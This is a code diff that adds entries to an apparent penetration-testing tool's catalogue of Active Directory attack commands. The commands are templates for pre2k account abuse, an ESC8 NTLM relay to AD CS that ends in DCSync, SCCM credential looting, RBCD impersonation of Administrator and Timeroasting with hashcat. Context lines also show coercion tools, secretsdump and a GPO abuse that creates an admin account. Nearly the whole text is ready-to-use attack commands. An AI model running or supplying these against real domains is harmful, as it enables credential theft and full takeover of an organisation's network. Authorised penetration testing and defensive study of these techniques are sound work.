@@ -4017,6 +4017,7 @@ _STEP_COMMANDS = {
             "smbclient -L //<RHOST>/ -N",
             "smbmap -H <RHOST> -u '' -p ''",
             "rpcclient -U '' -N <RHOST> -c 'enumdomusers;enumdomgroups;querydominfo'",
+            "pre2k unauth -d <DOMAIN> -dc-ip <RHOST>   # NO CREDS — pre-created computer accounts whose password == lowercase(computername)",
         ],
         2: [  # Version-RCE scan (detection only)
             "nmap -p445 --script 'smb-vuln-*' -oN smb-vuln.txt <RHOST>",
@@ -4051,6 +4052,7 @@ _STEP_COMMANDS = {
             "python3 PetitPotam.py -u '<USER>' -p '<PASS>' <LHOST> <RHOST>",
             "coercer coerce -u '<USER>' -p '<PASS>' -t <RHOST> -l <LHOST>",
             "printerbug.py '<DOMAIN>/<USER>:<PASS>@<RHOST>' <LHOST>",
+            "impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController   # ESC8: relay the coerced DC$ auth to AD CS web-enrol -> DC cert -> getTGT -> DCSync",
         ],
         8: [  # DC CVEs: ZeroLogon, noPac, PrintNightmare (detection only)
             "nxc smb <RHOST> -u '<USER>' -p '<PASS>' -M zerologon",
@@ -4813,6 +4815,7 @@ _STEP_COMMANDS = {
             "nxc ldap <RHOST> -u <USER> -p <PASS> --gmsa",
             "nxc ldap <RHOST> -u <USER> -p <PASS> -M get-desc-users   # passwords in the description field",
             "bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -ns <RHOST> -c All",
+            "sccmhunter find -u <USER> -p <PASS> -d <DOMAIN> -dc-ip <RHOST>   # locate SCCM/MECM site systems; then 'sccmhunter dpapi ...' to loot NAA credentials",
         ],
         4: [
             "certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <RHOST> -vulnerable -stdout   # ADCS ESC1-8",
@@ -4820,6 +4823,7 @@ _STEP_COMMANDS = {
             "impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASS>@<RHOST>   # DCSync (with rights)",
             "bloodyAD -u <USER> -p <PASS> -d <DOMAIN> --host <RHOST> get writable   # ACL abuse targets",
             "python3 pygpoabuse.py <DOMAIN>/<USER>:'<PASS>' -gpo-id <ID> -command 'net user pwn Passw0rd! /add && net localgroup administrators pwn /add'   # RCE via a GPO you can write (BloodHound often flags this)",
+            "impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to '<TARGET>$' -action write '<DOMAIN>/<USER>:<PASS>' && impacket-getST -spn cifs/<TARGET> -impersonate Administrator '<DOMAIN>/ATTACKER$:<PASS>'   # RBCD: write msDS-AllowedToActOnBehalfOfOtherIdentity then S4U",
         ],
     },
     "kerberos": {
@@ -4827,6 +4831,7 @@ _STEP_COMMANDS = {
             "nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='<DOMAIN>' <RHOST>",
             "kerbrute userenum -d <DOMAIN> --dc <RHOST> /usr/share/seclists/Usernames/Names/names.txt",
             "sudo ntpdate <RHOST>   # sync clock first — fixes KRB_AP_ERR_SKEW",
+            "python3 timeroast.py <RHOST> -o timeroast.hashes && hashcat -m 31300 timeroast.hashes /usr/share/wordlists/rockyou.txt   # Timeroasting: NO CREDS — computer/trust account hashes via NTP MS-SNTP (UDP/123)",
         ],
         2: [
             "impacket-GetNPUsers <DOMAIN>/ -dc-ip <RHOST> -usersfile /usr/share/seclists/Usernames/Names/names.txt -no-pass",
